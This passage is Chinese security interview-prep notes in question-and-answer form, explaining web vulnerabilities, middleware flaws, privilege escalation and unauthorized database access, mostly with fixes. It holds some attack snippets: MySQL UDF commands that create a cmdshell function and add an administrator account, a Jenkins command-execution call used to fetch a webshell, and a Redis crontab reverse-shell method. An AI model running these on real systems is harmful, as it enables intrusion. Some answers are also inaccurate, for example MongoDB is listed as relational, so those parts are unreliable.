<p>人工测试思路：找到类似 document.write、innerHTML 赋值、outterHTML 赋值、window.location 操作、写 javascript:后内容、eval、setTimeout 、setInterval 等直接执行之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经过安全函数。自动化测试参看道哥的博客，思路是从输入入手，观察变量传递的过程，最终检查是否有在危险函数输出，中途是否有经过安全函数。但是这样就需要有一个 javascript 解析器，否则会漏掉一些通过 js 执行带入的部分内容。 在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进行检测，对不同类型的 XSS 检测方式实际上并没有太过细分的标准化检测方式，所以回答的很烂。</p>
<p>对于 XSS 怎么修补建议</p>
<ol>
<li>输入点检查：对用户输入的数据进行合法性检查，使用 filter 过滤敏感字符或对进行编码转义，针对特定类型数据进行格式检查。针对输入点的检查最好放在服务器端实现。 </li>
<li>输出点检查：对变量输出到 HTML 页面中时，对输出内容进行编码转义，输出在 HTML 中时，对其进行 HTMLEncode；如果输出在 Javascript 脚本中时，对其进行 JavascriptEncode；还可以使用更加严格的方法，对所有数字字母之外的字符都使用十六进制编码。</li>
<li>做 HTTPOnly 对 Cookie 劫持做限制。</li>
</ol>
<p>防 XSS 的核心是必须对输入的数据做过滤处理。 </p>
<p>XSS 蠕虫的产生条件 </p>
<p>正常情况下，一个是产生 XSS 点的页面不属于 self 页面，用户之间产生交互行为的页面，都可能造成 XSS Worm 的产生。 不一定需要存储型 XSS </p>
<p>Cookie 存在哪里？可以打开吗？ </p>
<p>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Cookies</p>
<p>工具–文件夹选项–查看–将隐藏被保护的文件的对勾去掉就会看到 cookies 文件夹。 </p>
<p>XSS 有 Cookie 一定可以无用户名密码登录吗？ </p>
<p>基本可以。因为把 cookie 的值给浏览器，浏览器去访问页面会用已有的cookie去访问，如果cookie有效，就能直接进去。 </p>
<p>SSRF </p>
<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。 </p>
<ol>
<li><p>SSRF 漏洞的验证方法：</p>
<p>因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在 SSRF 漏洞 </p>
</li>
<li><p>SSRF 漏洞的成因 防御 绕过 </p>
<ol>
<li>成因：模拟服务器对其他服务器资源进行请求，没有做合法性验证。利用：构造恶意内网 IP 做探测，或者使用其余所支持的协议对其余服务进行攻击。</li>
<li>防御：禁止跳转，限制协议，内外网限制，URL 限制。</li>
<li>绕过：使用不同协议，针对 IP，IP 格式的绕过，针对 URL，恶意 URL 增添其他字符，@之类的。301 跳转+dns rebindding。</li>
</ol>
</li>
</ol>
<p>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？ </p>
<p>XSS 是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用 HTTP Only 来禁止 JavaScript 读取 Cookie 值、输入时校验、浏览器与 Web 应用端采用相同的字符编码。 </p>
<p>CSRF 是跨站请求伪造攻击，XSS 是实现 CSRF 的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范 CSRF 的页面然后嵌入 Token、再次输入密码、检验 Referer </p>
<p>XXE 是 XML 外部实体注入攻击，XML 中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML 解析库在调用时严格禁止对外部实体的解析。 </p>
<p>CSRF、SSRF 和重放攻击有什么区别？ </p>
<p>CSRF 是跨站请求伪造攻击，由客户端发起 SSRF 是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进行重放，达到身份认证等目的 </p>
<p>说出至少三种业务逻辑漏洞，以及修复方式？ </p>
<p>密码找回漏洞中存在 </p>
<ol>
<li>密码允许暴力破解</li>
<li>通用型找回凭证</li>
<li>可以跳过验证步骤</li>
<li>找回凭证可以拦包获取</li>
</ol>
<p>身份认证漏洞中最常见的是</p>
<ol>
<li>会话固定攻击 </li>
<li>Cookie 仿冒只要得到 Session 或 Cookie 即可伪造用户身份。</li>
<li>验证码允许暴力破解 </li>
<li>验证码可以通过 Javascript 或者改包的方法来进行绕过</li>
</ol>
<p>什么是文件上传漏洞 </p>
<p>文件上传漏洞，一般是由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件，或者说可执行的脚本文件，并通过此脚本文件获得了执行服务端命令的能力。许多第三方框架、服务，都曾经被爆出文件上传漏洞，比如很早之前的Struts2，以及富文本编辑器等等，可被攻击者上传恶意代码，有可能服务端就被人黑了。</p>
<p>如何防范文件上传漏洞</p>
<ol>
<li>文件上传的目录设置为不可执行。</li>
<li>判断文件类型。在判断文件类型的时候，可以结合使用 MIME Type，后缀检查等方式。因为对于上传文件，不能简单地通过后缀名称来判断文件的类型，因为攻击者可以将可执行文件的后缀名称改为图片或其他后缀类型，诱导用户执行。</li>
<li>对上传的文件类型进行白名单校验，只允许上传可靠类型。 </li>
<li>上传的文件需要进行重新命名，使攻击者无法猜想上传文件的访问路径，将极大地增加攻击成本，同时像shell .php .rar .ara 这种文件，因为重命名而无法成功实施攻击。 </li>
<li>限制上传文件的大小。 </li>
<li>单独设置文件服务器的域名。</li>
</ol>
<p>文件包含 </p>
<ol>
<li><p>原理</p>
<p>引入一段用户能控制的脚本或代码，并让服务器端执行 include()等函数通过动态变量的方式引入需要包含的文件；用户能够控制该动态变量。</p>
</li>
<li><p>导致文件包含的函数：</p>
<ol>
<li>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfile(), … </li>
<li>JSP&#x2F;Servlet： ava.io.File(), java.io.Fil-eReader(), … </li>
<li>ASP：include file, include virtual,…</li>
</ol>
</li>
<li><p>本地文件包含 </p>
<p>能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞</p>
</li>
</ol>
<p>代码执行，文件读取，命令执行的函数都有哪些？ </p>
<ol>
<li>代码执行： eval,preg_replace+&#x2F;e,assert,call_user_func,call_user_func_array,create_function</li>
<li>文件读取： file_get_contents(),highlight_file(),fopen(),read file(), ,fread(),fgetss(),fgets(),parse_ini_file(),show_source(),file()等 </li>
<li>命令执行： system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</li>
</ol>
<p>金融行业常见逻辑漏洞 </p>
<p>单针对金融业务的 主要是数据的篡改(涉及金融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅羊毛，交易&#x2F;订单信息泄露，水平越权对别人的账户查看或恶意操作，交易或业务步骤绕过。 </p>
<p>什么是WebShell? </p>
<ol>
<li>WebShell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的─种命令执行环境，也可以将其称做为─种网页后门。</li>
<li>黑客在入侵了─个网站后，通常会将这些 asp 或 php 后门文件与网站服务器 WEB 目录下正常的网页文件混在─起，然后 就可以使用浏览器来访问这些 asp 或者 php 后门，得到─个命令执行环境，以达到控制网站服务器的目的（可以上传下载文件，查看数据库，执行任意程序命令 等）。</li>
<li>国内常用的 WebShell 有海阳 ASP 木马，Phpspy，c99shell 等。</li>
</ol>
<p>什么是网络钓鱼？ </p>
<ol>
<li>网络钓鱼是通过大量发送声称来自于银行或其他知名机构的欺骗性垃圾邮件,意图引诱收信人给出敏感信息（如用户名、口令、帐号 ID 、 ATMPIN 码或信用卡详细信息）的一种攻击方式。</li>
<li>最典型的网络钓鱼攻击将收信人引诱到一个通过精心设计与目标组织的网站非常相似的钓鱼网站上，并获取收信人在此网站上输入的个人敏感信息。</li>
<li>通常这个攻击过程不会让受害者警觉，它常常导引用户到 URL 与接口外观与真正网站几无二致的假冒网站输入个人数据。就算使用强式加密的 SSL 服务器认证，要侦测网站是否仿冒实际上仍很困难。网钓是一种利用社会工程技术来愚弄用户的实例。它凭恃的是现行网络安全技术的低亲和度。</li>
</ol>
<p>如何拿一个网站的 webshell？</p>
<p>上传，后台编辑模板，sql 注入写文件，命令执行，代码执行， 一些已经爆出的 cms 漏洞，比如 dedecms 后台可以直接建立脚本文件，wordpress 上传插件包含脚本文件 zip 压缩包等 </p>
<p>为什么 aspx 木马权限比 asp 大？ </p>
<p>aspx 使用的是.net 技术。IIS 中默认不支持，ASP 只是脚本语言而已。入侵的时候 asp 的木马一般是 guest 权限…APSX 的木马一般是 users 权限。 </p>
<p>正向代理和反向代理的区别 </p>
<p>正向代理，当客户端无法访问外部资源的时候（比如 Google、YouTube），可以通过一个正向代理去间接地访问。正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。 </p>
<p>反向代理，客户端是无感知代理的存在，以代理服务器来接受 internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端。此时代理服务器对外就表现为一个服务器。 </p>
<p>蚁剑&#x2F;菜刀&#x2F;C 刀&#x2F;冰蝎的相同与不相同之处 </p>
<p>相同：都是用来连接 Web Shell 的工具 </p>
<p>不同：相比于其他三款，冰蝎有流量动态加密 </p>
<p>正向 SHELL 和反向 SHELL 的区别 </p>
<p>正向 Shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。</p>
<p>反向 Shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。</p>
<p>正向代理即是客户端代理, 代理客户端, 服务端不知道实际发起请求的客户端. 反向代理即是服务端代理, 代理服务端, 客户端不知道实际提供服务的服务端</p>
<p>判断出网站的CMS对渗透有什么意义？</p>
<p>查找网上已曝光的程序漏洞。</p>
<p>如果开源，还能下载相对应的源码进行代码审计。 </p>
<p>一个成熟并且相对安全的CMS，渗透时扫目录的意义？</p>
<p>敏感文件、二级目录扫描 </p>
<p>站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点 </p>
<p>常见的网站服务器容器。</p>
<p>IIS、Apache、nginx、Lighttpd、Tomcat、JBoss、Weblogic</p>
<p>常见的中间件漏洞？ </p>
<ol>
<li>IIS ：PUT 漏洞、短文件名猜解、远程代码执行、解析漏洞 </li>
<li>Apache ：解析漏洞、目录遍历 </li>
<li>Nginx ：文件解析、目录遍历、CRLF 注入、目录穿越 </li>
<li>Tomcat ：远程代码执行、war 后门文件部署 </li>
<li>JBoss ：反序列化漏洞、war 后门文件部署 </li>
<li>WebLogic：反序列化漏洞、 SSRF 任意文件上传 、war 后门文件部署 </li>
<li>Apache Shiro ：反序列化漏洞 、Shiro rememberMe（Shiro-550） 、Shiro Padding Oracle Attack(Shiro-721) </li>
<li>IIS 6.0  &#x2F;xx.asp&#x2F;xx.jpg “xx.asp”是文件夹名</li>
<li>IIS 7.0&#x2F;7.5  默认 Fast-CGI 开启，直接在 url 中图片地址后面输入&#x2F;1.php，会把正常图片当成 php 解析 </li>
<li>Nginx    版本小于等于 0.8.37，利用方法和 IIS 7.0&#x2F;7.5 一样，Fast-CGI 关闭情况下也可利用。空字节代码 xxx.jpg.php </li>
<li>Apache 上传的文件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀 </li>
<li>lighttpd  xx.jpg&#x2F;xx.php</li>
</ol>
<p>IIS 服务器应该做哪些方面的保护措施： </p>
<p>整理来源：<a target="_blank" rel="noopener" href="http://www.williamlong.info/archives/118.html">http://www.williamlong.info/archives/118.html</a></p>
<ol>
<li>保持 Windows 升级: </li>
<li>使用 IIS 防范工具 </li>
<li>移除缺省的 Web 站点 </li>
<li>如果你并不需要 FTP 和 SMTP 服务，请卸载它们 </li>
<li>有规则地检查你的管理员组和服务:</li>
<li>严格控制服务器的写访问权限 </li>
<li>设置复杂的密码 </li>
<li>减少&#x2F;排除 Web 服务器上的共享 </li>
<li>禁用 TCP&#x2F;IP 协议中的 NetBIOS: </li>
<li>使用 TCP 端口阻塞 </li>
<li>仔细检查*.bat 和*.exe 文件: 每周搜索一次*.bat </li>
<li>管理 IIS 目录安全: </li>
<li>使用 NTFS 安全: </li>
<li>管理用户账户 </li>
<li>审计你的 Web 服务器:</li>
</ol>
<p>中间人攻击 </p>
<p>中间人攻击是一个（缺乏）相互认证的攻击；由于客户端与服务器之间在 SSL 握手的过程中缺乏相互认证而造成的漏洞 </p>
<p>防御中间人攻击的方案通常基于一下几种技术 </p>
<ol>
<li>公钥基础建设 PKI 使用 PKI 相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例子中都是只验证服务器，这样就造成了 SSL 握手环节的漏洞，而如果使用相互认证的的话，基本可以更强力的相互认证</li>
<li>延迟测试使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费 20 秒来计算，并且整个通讯花费了 60 秒计算才到达对方，这就能表明存在第三方中间人。</li>
<li>使用其他形式的密钥交换形式</li>
</ol>
<p>ARP 欺骗 </p>
<ol>
<li><p>原理</p>
<p>每台主机都有一个 ARP 缓存表，缓存表中记录了 IP 地址与 MAC 地址的对应关系，而局域网数据传输依靠的是 MAC 地址。在 ARP 缓存表机制存在一个缺陷，就是当请求主机收到 ARP 应答包后，不会去验证自己是否向对方主机发送过 ARP 请求包，就直接把这个返回包中的 IP 地址与 MAC 地址的对应关系保存进 ARP 缓存表中，如果原有相同 IP 对应关系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能 </p>
</li>
<li><p>防护</p>
<ol>
<li>在主机绑定网关 MAC 与 IP 地址为静态（默认为动态），命令：arp -s 网关 IP 网关 MAC </li>
<li>在网关绑定主机 MAC 与 IP 地址 </li>
<li>使用 ARP 防火墙</li>
</ol>
</li>
</ol>
<p>什么是网络钓鱼？ </p>
<p>网络钓鱼是通过大量发送声称来自于银行或其他知名机构的欺骗性垃圾邮件,意图引诱收信人给出敏感信息（如用户名、口令、帐号 ID 、ATMPIN 码或信用卡详细信息）的一种攻击方式。最典型的网络钓鱼攻击将收信人引诱到一个通过精心设计与目标组织的网站非常相似的钓鱼网站上，并获取收信人在此网站上输入的个人敏感信息，通常这个攻击过程不会让受害者警觉。它常常导引用户到 URL 与接口外观与真正网站几无二致的假冒网站输入个人数据。就算使用强式加密的 SSL 服务器认证，要侦测网站是否仿冒实际上仍很困难。网钓是一种利用社会工程技术来愚弄用户的实例。它凭恃的是现行网络安全技术的低亲和度。</p>
<p>DDOS </p>
<ol>
<li><p>DDOS 原理 </p>
<p>利用合理的请求造成资源过载，导致服务不可用 </p>
</li>
<li><p>syn 洪流的原理 </p>
<p>SYN 攻击利用 TCP 协议缺陷，通过发送大量的半连接请求，耗费 CPU 和内存资源。 </p>
<p>SYN 攻击除了能影响主机外，还可以危害路由器、防火墙等网络系统，事实上 SYN 攻击并不管目标是什么系统，只要这些系统打开 TCP 服务就可以实 施。服务器接收到连接请求（SYN&#x3D;1），将此信息加入未连接队列，并发送请 求包给客户（syn&#x3D;k,ack&#x3D;j+1），此时进入 SYN_RECV 状态。当服务器未收到客户端的确认包时，重发请求包，一直到超时，才将此条目从未连接队列删除。配合 IP 欺骗，SYN 攻击能达到很好的效果，通常，客户端在短时间内伪造大量 不存在的 IP 地址，向服务器不断地发送 syn 包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的 SYN 包将长时间占用未连接队列，正常的 SYN 请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。 </p>
</li>
<li><p>CC 攻击原理 </p>
<p>CC 攻击的原理就是攻击者控制某些主机不停地发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。CC 主要是用来攻击页面的，每个人都有这样的体验：当一个网页访问的人数特别多的时候，打开网页就慢了，CC 就是模拟多个用户（多少线程就是多少用户）不停地进行访问那些需要大量数据操作（就是需要大量 CPU 时间）的页面，造成服务器资源的浪费，CPU 长时间处于 100%，永远都有处理不完的连接直至就网络拥塞，正常的访问被中止。 </p>
</li>
<li><p>DDOS 防护 </p>
<p>SYN Cookie&#x2F;SYN Proxy、safereset 等算法。SYN Cookie 的主要思想是为每一个 IP 地址分配一个“Cookie”，并统计每个 IP 地址的访问频率。如果在短时间内收到大量的来自同一个 IP 地址的数据包，则认为受到攻击，之后来自这个 IP 地址的包将被丢弃。 </p>
<ol>
<li>限制同时打开 SYN 半链接的数目 </li>
<li>缩短 SYN 半链接的 Time out 时间 </li>
<li>关闭不必要的服务</li>
</ol>
</li>
</ol>
<p>Windows 常用的提权方法 </p>
<ol>
<li>系统内核溢出漏洞提权 </li>
<li>数据库提权 </li>
<li>错误的系统配置提权 </li>
<li>组策略首选项提权 </li>
<li>WEB 中间件漏洞提权 </li>
<li>DLL 劫持提权 </li>
<li>滥用高危权限令牌提权 </li>
<li>第三方软件&#x2F;服务提权等</li>
</ol>
<p>Linux 提权有哪些方法 </p>
<ol>
<li>Linux 内核漏洞提权 </li>
<li>低权限用户目录下可被 Root 权限用户调用的脚本提权（SUID） </li>
<li>环境变了劫持高权限程序提权 </li>
<li>sudoer 配置文件错误提权</li>
</ol>
<p>mysql 两种提权方式 ：udf 提权  和 mof 提权 </p>
<ol>
<li><p>Mysql_UDF 提权 </p>
<p>要求: </p>
<ol>
<li>目标系统是 Windows(Win2000,XP,Win2003)；</li>
<li>拥有 MYSQL 的某个用户账号，此账号必须有对 mysql 的 insert 和 delete 权限以创建和抛弃函数 </li>
<li>有 root 账号密码 导出 udf: MYSQL 5.1 以上版本，必须要把 udf.dll 文件放到 MYSQL 安装目录下的 lib\plugin 文件夹下才能创建自定义函数 可以在 mysql 里输入 select @@basedirshow variables like ‘%plugins%’ 寻找 mysql 安装路径 提权:使用 SQL 语句创建功能函数。</li>
<li>语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname；</li>
<li>导出的 DLL 路径’代码：create function cmdshell returns string soname ‘udf.dll’select cmdshell(‘net user arsch arschadd’);select cmdshell(‘net localgroup administrators arsch &#x2F;add’); drop function cmdshell;</li>
<li>该目录默认是不存在的，这就需要我们使用 webshell 找到 MYSQL 的安装目录，并在安装目录下创建 lib\plugin 文件夹，然后将 udf.dll 文件导出到该目录即可。</li>
</ol>
</li>
<li><p>Mysql mof 提权</p>
</li>
</ol>
<p>Redis 未授权访问 </p>
<ol>
<li><p>产生原因 </p>
<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器 </p>
</li>
<li><p>利用条件和方法 </p>
<ol>
<li>条件: <ol>
<li>redis 服务以 root 账户运行 </li>
<li>redis 无密码或弱密码进行认证 </li>
<li>redis 监听在 0.0.0.0 公网上</li>
</ol>
</li>
<li>方法: <ol>
<li>通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫 </li>
<li>上传 SSH 公钥获得 SSH 登录权限 </li>
<li>通过 crontab 反弹 shell </li>
<li>lave 主从模式利用</li>
</ol>
</li>
</ol>
</li>
<li><p>修复</p>
<ol>
<li>密码验证</li>
<li>降权运行</li>
<li>限制 ip&#x2F;修改端口</li>
</ol>
</li>
</ol>
<p>Jenkins 未授权访问攻击者通过未授权访问进入脚本命令执行界面执行攻击指令 </p>
<p>println “ifconfig -a”.execute().text 执行一些系统命令,利用 wget 下载 webshell </p>
<p>MongoDB 未授权访问 </p>
<p>开启 MongoDB 服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。 </p>
<p>防护</p>
<ol>
<li><p>为 MongoDB 添加认证：</p>
<p>MongoDB 启动时添加–auth 参数，然后再给 MongoDB 添加用户：use admin #使用 admin 库 db.addUser(“root”, “123456”) #添加用户名 root 密码 123456 的用户 db.auth(“root”,“123456”) #验证下是否添加成功，返回 1 说明成功 </p>
</li>
<li><p>禁用 HTTP 和 REST 端口 </p>
<p>MongoDB自身带有一个 HTTP服务和并支持 REST 接口。在2.6 以后这些接口默认是关闭的。mongoDB 默认会使用默认端口监听 web 服务，一般不需要通过 web 方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数 nohttpinterface&#x3D;false 3、限制绑定 IP 启动时加入参数 –bind_ip 127.0.0.1 或在&#x2F;etc&#x2F;mongodb.conf 文件中添加以下内容：bind_ip &#x3D; 127.0.0.1</p>
</li>
</ol>
<p>Memcache 未授权访问 </p>
<p>Memcached 是一套常用的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公网开放的 Memcache 服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。</p>
<p>利用</p>
<ol>
<li>登录机器执行 netstat -an |more 命令查看端口监听情况。回显 0.0.0.0:11211 表示在所有网卡进行监听，存在 memcached 未授权访问漏洞。 </li>
<li>telnet 11211，或 nc -vv 11211，提示连接成功表示漏洞存在</li>
</ol>
<p>漏洞加固 </p>
<ol>
<li>设置 memchached 只允许本地访问</li>
<li>禁止外网访问 Memcached 11211 端口</li>
<li>编译时加上 –enable-sasl，启用 SASL 认证FFMPEG 本地文件读取漏洞</li>
</ol>
<p>同源策略 </p>
<p>同源策略限制不同源对当前 document 的属性内容进行读取或设置。不同源的区分：协议、域名、子域名、IP、端口，以上有不同时即不同源。 为了防止不同域在用户浏览器中彼此干扰，浏览器对从不同来源（域）收到的内容进行隔离。浏览器不允许任何旧有脚本访问一个站点的 cookie，否则，会话容易被劫持。只有发布 cookie 的站点能够访问这些 cookie，只有通过该站点返回的页面所包含或加载的 JavaScript 才能访问 cookie。 </p>
<p>dll 文件是什么意思，有什么用？ </p>
<p>DLL（Dynamic Link Library）文件，即动态链接库，也有人称作应用程序拓展。Windows 应用程序中，实行了模块化设计，也就是说并不是每个应用程序都编写完所有的功能代码，而是在运行过程中调用相应功能的 DLL，不需运行的功能就不调用，所以大大加快了程序的加载速度和效率，其他应用程序也可以调用相关的 DLL，这样也有利于促进代码重用以及内存使用效率，减少了资源占用，而且程序更新时也只要更新相关的 DLL 就可以了。要注意的是，有些病毒也会伪装成 DLL 文件，并替换系统的 DLL 文件，需要我们防范。 </p>
<p>DLL 劫持原理 </p>
<p>由于输入表中只包含 DLL 名而没有它的路径名，因此加载程序必须在磁盘上搜索 DLL 文件。首先会尝试从当前程序所在的目录加载 DLL，如果没找到，则在 Windows 系统目录中查找，最后是在环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的 DLL，提供同样的输出表，每个输出函数转向真正的系统 DLL。程序调用系统 DLL 时会先调用当前目录下伪造的 DLL，完成相关功能后，再跳到系统 DLL 同名函数里执行。这个过程用个形象的词来描述就是系统 DLL 被劫持（hijack）了。伪造的 dll 制作好后，放到程序当前目录下，这样当原程序调用原函数时就调用了伪造的 dll 的同名函数，进入劫持 DLL 的代码，处理完毕后，再调用原DLL 此函数。 </p>
<p>如何防止 DLL 劫持 </p>
<p>DLL 劫持利用系统未知 DLL 的搜索路径方式，使得程序加载当前目录下的系统同名 DLL。所以可以告诉系统 DLL 的位置，改变加载系统 DLL 的顺序不是当前目录，而是直接到系统目录下查找。 </p>
<p>你获取网络安全知识途径有哪些？ </p>
<ol>
<li>网站，看雪，安全焦点，国内的乌云，FreeBuf </li>
<li>视频学习：i 春秋，51cto，慕课网，实验楼，实验吧，网易云课堂等等 </li>
<li>微信公众号、知乎等，企业 src 等 </li>
<li>书籍，《白帽子讲 web 安全》《Web 应用安全权威指南》等 </li>
<li>请教牛人 </li>
<li>公司内技术分享。 </li>
<li>等等，之类题目自己发挥</li>
</ol>
<p>0day 漏洞 </p>
<p>是已经发现但是官方还没发布补丁的漏洞。信息安全意义上的 0Day 是指在安全补丁发布前而被了解和掌握的漏洞信息。</p>
<p>Rootkit 是什么意思 </p>
<ol>
<li>Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。</li>
<li>Rootkit主要目的就是持久并毫无察觉地驻留在目标计算机中，对系统进行操纵、并通过隐秘渠道收集数据的程序。Rootkit的三要素就是：隐藏、操纵、收集数据。</li>
<li>其功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的。</li>
</ol>
<p>震网病毒： </p>
<p>指一种蠕虫病毒，是第一个专门定向攻击真实世界中基础（能源）设施的“蠕虫”病毒，比如核电站，水坝，国家电网。只要电脑操作员将被病毒感染的 U 盘插入 USB 接口，这种病毒就会在神不知鬼不觉的情况下(不会有任何其他操作要求或者提示出现)取得一些工业用电脑系统的控制权。与传统的电脑病毒相比，“震网”病毒不会通过窃取个人隐私信息牟利。无需借助网络连接进行传播。这种病毒可以破坏世界各国的化工、发电和电力传输企业所使用的核心生产控制电脑软件，并且代替其对工厂其他电脑“发号施令”。极具毒性和破坏力。“震网”代码非常精密，主要有两个功能，一是使伊朗的离心机运行失控，二是掩盖发生故障的情况，“谎报军情”，以“正常运转”记录回传给管理部门，造成决策的误判。 </p>
<p>手工查找后门木马的小技巧 </p>
<ol>
<li>首先最需要注意的地方是系统的启动项，可以在“运行”-输入“msconfig 命令”在打开的系统配置实用程序里的启动列表查看，并且服务也要注意一下，如果对电脑不是太熟悉的童鞋建议使用 360 安全卫士的开机加速功能，来查看有无异常的可以启动项和服务项，因为在后门木马中 99%都会注册自己为系统服务，达到开机自启动的目的，如果发现可疑项直接打开相应的路径，找到程序文件直接删除并且禁止自启动； </li>
<li>查看系统关键目录 system32 和系统安装目录 Windows 下的文件，xp 系统下两者默认路径分别是 C:\WINDOWS\system32 和 C:\WINDOWS\。然后最新修改的文件中有没有可疑的可执行文件或 dll 文件，这两个地方都是木马最喜欢的藏身的地方了（小提示：一定要设置显示所有的文件的文件夹哦）。 </li>
<li>观察网络连接是否存在异常，还有“运行”-“cmd”-“netstat -an”查看有没有可疑或非正常程序的网络连接，如果对电脑不是很熟悉建议大家使用 360 的流量监控功能更加直观和方便，尤其注意一下远程连接的端口，如果有类似于 8000 等端口就要注意了，8000 是灰鸽子的默认端口，记得有一次自己就在后门木马测试中在网络连接中发现 8000 端口，当然意思不是说只要没有 8000 端口的网络连接就一定安全，因为 8000 端口只是灰鸽子上线的默认端口，并且端口是可以更改的。通过以上方法，可以查找到电脑的一些可疑文件，如果确认无疑，就可以手工进行删除了。当然还可以借助杀毒软件的力量。如果你真的中了木马后门，不用慌。最好最彻底的方法是重装系统后，在安全模式下，利用最新病毒库的杀软进行查杀。</li>
</ol>
<p>数据库有哪些，关系型的和非关系型的分别是哪些 </p>
<p>关系型 </p>
<ol>
<li>MySQL：3306 </li>
<li>SQL Server：1433 </li>
<li>Oracle：1521 </li>
<li>DB2：5000 </li>
<li>MongoDB：27017</li>
</ol>
<p>非关系型</p>
<ol>
<li>Redis：6379 </li>
<li>Memcached：11211</li>
</ol>
<p>内网穿透 </p>
<p>即 NAT 穿透，采用端口映射，让外网的电脑找到处于内网的电脑，同时也可基于 HTTP&#x2F;2 实现 web 内网穿透。 </p>
<p>虚拟专用网络 </p>
<p>功能是：在公用网络上建立专用网络，进行加密通讯。在企业网络中有广泛应用。VPN 网关通过对数据包的加密和数据包目标地址的转换实现远程访问。例如某公司员工出差到外地，他想访问企业内网的服务器资源，这种访问就属于远程访问。让外地员工访问到内网资源，利用 VPN 的解决方法就是在内网中架设一台 VPN服务器。外地员工在当地连上互联网后，通过互联网连接 VPN 服务器，然后通过 VPN 服务器进入企业内网。为了保证数据安全，VPN 服务器和客户机之间的通讯数据都进行了加密处理。有了数据加密，就可以认为数据是在一条专用的数据链路上进行安全传输，就如同专门架设了一个专用网络一样，但实际上 VPN 使用的是互联网上的公用链路，因此 VPN 称为虚拟专用网络，其实质上就是利 用加密技术在公网上封装出一个数据通讯隧道。有了 VPN 技术，用户无论是在 外地出差还是在家中办公，只要能上互联网就能利用 VPN 访问内网资源，这就是 VPN 在企业中应用得如此广泛的原因。 </p>
<p>脱壳 </p>
<p>而从技术的角度出发，壳是一段执行于原始程序前的代码。原始程序的代码在加壳的过程中可能被压缩、加密……。当加壳后的文件执行时，壳－这段代码先于原始程序运行，他把压缩、加密后的代码还原成原始程序代码，然后再把执行权交还给原始代码。软件的壳分为加密壳、压缩壳、伪装壳、多层壳等类，目的都是为了隐藏程序真正的 OEP（入口点，防止被破解）。加壳”指的是对编译好的 EXE、DLL 等文件采用加壳来进行保护；“脱壳”指的就是将文件外边的壳去除，恢复文件没有加壳前的状态。壳出于程序作者想对程序资源压缩、注册保护的目的，把壳分为压缩壳、密码壳、加密壳三种。顾名思义，压缩壳只是为了减小程序体积对资源进行压缩，常见的压缩壳包括 FSG、ASPack、UPX、北斗等；加密壳也就是常说的保护壳、猛壳，它对程序输入表等内容进行加密保护，具有良好的保护效果，常见的加密壳包括 ASPROTECT、ACPROTECT、PELock、幻影等；密码壳平时使用得不多，加密壳的程序只有在正确输入密码后才能运行 </p>
<p>什么是手机越狱</p>
